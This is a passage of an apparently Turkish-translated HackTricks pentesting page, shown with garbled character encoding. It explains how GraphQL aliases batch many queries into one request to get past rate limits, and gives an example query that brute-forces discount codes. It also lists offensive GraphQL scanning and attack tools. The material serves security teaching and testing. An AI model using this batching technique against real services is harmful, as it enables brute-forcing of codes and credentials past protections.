GraphQL'de, takma adlar, bir API isteÄŸi yapÄ±lÄ±rken Ã¶zelliklerin **aÃ§Ä±kÃ§a adlandÄ±rÄ±lmasÄ±na** olanak saÄŸlayan gÃ¼Ã§lÃ¼ bir Ã¶zelliktir. Bu yetenek, tek bir istek iÃ§inde aynÄ± tÃ¼rden **Ã§oklu Ã¶rneÄŸi** almak iÃ§in Ã¶zellikle kullanÄ±ÅŸlÄ±dÄ±r. Takma adlar, GraphQL nesnelerinin aynÄ± isme sahip birden fazla Ã¶zelliÄŸe sahip olmasÄ±nÄ± engelleyen sÄ±nÄ±rlamayÄ± aÅŸmak iÃ§in kullanÄ±labilir.

GraphQL takma adlarÄ± hakkÄ±nda ayrÄ±ntÄ±lÄ± bir anlayÄ±ÅŸ iÃ§in aÅŸaÄŸÄ±daki kaynak Ã¶nerilir: [Takma Adlar](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Takma adlarÄ±n temel amacÄ±, Ã§ok sayÄ±da API Ã§aÄŸrÄ±sÄ±na gerek duymadan yapÄ±lmasÄ±nÄ± saÄŸlamaktÄ±r, ancak takma adlarÄ±n kullanÄ±labileceÄŸi istenmeyen bir kullanÄ±m durumu tespit edilmiÅŸtir. Takma adlar, GraphQL uÃ§ noktasÄ±nda brute force saldÄ±rÄ±larÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir. Bu, bazÄ± uÃ§ noktalarÄ±n, HTTP isteklerinin sayÄ±sÄ±nÄ± sÄ±nÄ±rlayarak brute force saldÄ±rÄ±larÄ±nÄ± engellemek iÃ§in tasarlanmÄ±ÅŸ hÄ±z sÄ±nÄ±rlayÄ±cÄ±larla korunduÄŸu anlamÄ±na gelir. Bununla birlikte, bu hÄ±z sÄ±nÄ±rlayÄ±cÄ±lar her istekteki iÅŸlemlerin sayÄ±sÄ±nÄ± hesaba katmayabilir. Takma adlar, birden fazla sorguyu tek bir HTTP isteÄŸine dahil etme olanaÄŸÄ± saÄŸladÄ±ÄŸÄ±ndan, bu tÃ¼r hÄ±z sÄ±nÄ±rlama Ã¶nlemlerini atlayabilir.

AÅŸaÄŸÄ±daki Ã¶rnek, takma adlÄ± sorgularÄ±n maÄŸaza indirim kodlarÄ±nÄ±n geÃ§erliliÄŸini doÄŸrulamak iÃ§in nasÄ±l kullanÄ±labileceÄŸini gÃ¶stermektedir. Bu yÃ¶ntem, bir HTTP isteÄŸine birden Ã§ok sorgu derleyerek hÄ±z sÄ±nÄ±rlamasÄ±nÄ± atlamaya olanak saÄŸladÄ±ÄŸÄ±ndan, potansiyel olarak birÃ§ok indirim kodunun aynÄ± anda doÄŸrulanmasÄ±na izin verebilir.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## AraÃ§lar

### ZayÄ±flÄ±k tarama araÃ§larÄ±

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): ÅemalarÄ± almak ve hassas verileri aramak, yetkilendirme testi yapmak, ÅŸemalarÄ± brute force etmek ve belirli bir tÃ¼re giden yollarÄ± bulmak iÃ§in kullanÄ±labilen bir araÃ§ takÄ±mÄ±.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): BaÄŸÄ±msÄ±z olarak veya [Burp eklentisi](https://github.com/doyensec/inql) olarak kullanÄ±labilir.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): SaldÄ±rÄ±larÄ± otomatikleÅŸtirmek iÃ§in CLI istemcisi olarak da kullanÄ±labilir.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Bir GraphQL ÅŸemasÄ±nda belirli bir tÃ¼re ulaÅŸmanÄ±n farklÄ± yollarÄ±nÄ± listeleyen bir araÃ§.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): GeliÅŸmiÅŸ GraphQL testleri iÃ§in Burp eklentisi. InQL v5.0'Ä±n Ã§ekirdeÄŸi olan _**Scanner**_ ile bir GraphQL uÃ§ noktasÄ±nÄ± veya yerel bir tanÄ±tÄ±m ÅŸema dosyasÄ±nÄ± analiz edebilirsiniz. TÃ¼m olasÄ± sorgularÄ± ve mutasyonlarÄ± otomatik olarak oluÅŸturur ve analiz iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir gÃ¶rÃ¼nÃ¼mde dÃ¼zenler. _**Attacker**_ bileÅŸeni, kÃ¶tÃ¼ bir ÅŸekilde uygulanmÄ±ÅŸ hÄ±z sÄ±nÄ±rlarÄ±nÄ± atlamak iÃ§in kullanÄ±ÅŸlÄ± olabilecek toplu GraphQL saldÄ±rÄ±larÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±za olanak tanÄ±r.

### Ä°stemciler

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Grafiksel kullanÄ±cÄ± arayÃ¼zÃ¼ (GUI) istemcisi
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Grafiksel kullanÄ±cÄ± arayÃ¼zÃ¼ (GUI) istemcisi

### Otomatik Testler

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL'i aÃ§Ä±klayan video: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referanslar

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **tanÄ±tmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>
